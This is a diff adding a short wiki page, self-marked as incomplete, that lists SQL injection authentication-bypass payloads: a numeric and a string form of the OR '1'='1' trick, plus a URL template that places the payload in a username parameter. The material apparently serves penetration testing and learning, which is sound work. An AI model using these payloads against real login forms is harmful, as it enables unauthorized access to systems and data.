@@ -1,0 +1,37 @@
+
+<h1 class="sectionedit1" id="sql_injection">SQL Injection</h1>
+<div class="level1">
+<!-- EDIT{&quot;target&quot;:&quot;plugin_wrap_start&quot;,&quot;hid&quot;:&quot;&quot;,&quot;secid&quot;:2,&quot;range&quot;:&quot;0-&quot;} --><div class="wrap_center wrap_round wrap_important plugin_wrap" style="width: 60%;">
+<p>
+This section is incomplete and needs further work!
+</p>
+</div><!-- EDIT{&quot;target&quot;:&quot;plugin_wrap_end&quot;,&quot;hid&quot;:&quot;&quot;,&quot;secid&quot;:3,&quot;range&quot;:&quot;0-&quot;} -->
+</div>
+<!-- EDIT{&quot;target&quot;:&quot;section&quot;,&quot;name&quot;:&quot;SQL Injection&quot;,&quot;hid&quot;:&quot;sql_injection&quot;,&quot;codeblockOffset&quot;:0,&quot;secid&quot;:1,&quot;range&quot;:&quot;1-123&quot;} -->
+<h2 class="sectionedit4" id="input_box">Input Box</h2>
+<div class="level2">
+<ul>
+<li class="level1"><div class="li">Non-string:<pre class="code sql"><span class="nu0">1</span> <span class="kw1">OR</span> <span class="st0">'1'</span><span class="sy0">=</span><span class="st0">'1'</span>;<span class="co1">-- -</span></pre>
+</div>
+</li>
+<li class="level1"><div class="li">String:<pre class="code sql"><span class="st0">' OR '</span><span class="nu0">1</span><span class="st0">'='</span><span class="nu0">1</span><span class="st0">';-- -</span></pre>
+</div>
+</li>
+</ul>
+
+</div>
+<!-- EDIT{&quot;target&quot;:&quot;section&quot;,&quot;name&quot;:&quot;Input Box&quot;,&quot;hid&quot;:&quot;input_box&quot;,&quot;codeblockOffset&quot;:0,&quot;secid&quot;:4,&quot;range&quot;:&quot;124-246&quot;} -->
+<h2 class="sectionedit5" id="url">URL</h2>
+<div class="level2">
+<ul>
+<li class="level1"><div class="li">GET request:<pre class="code">http[s]://&lt;SERVER&gt;[:PORT][/PATH]?&lt;USERNAME=&gt;&#039; OR &#039;1&#039;=&#039;1&#039;;-- -&lt;&amp;PASSWORD=&gt;1</pre>
+</div>
+</li>
+</ul>
+
+<p>
+<a href="https://www.sqlinjection.net" class="urlextern" title="https://www.sqlinjection.net">https://www.sqlinjection.net</a>
+</p>
+
+</div>
+<!-- EDIT{&quot;target&quot;:&quot;section&quot;,&quot;name&quot;:&quot;URL&quot;,&quot;hid&quot;:&quot;url&quot;,&quot;codeblockOffset&quot;:2,&quot;secid&quot;:5,&quot;range&quot;:&quot;247-&quot;} -->
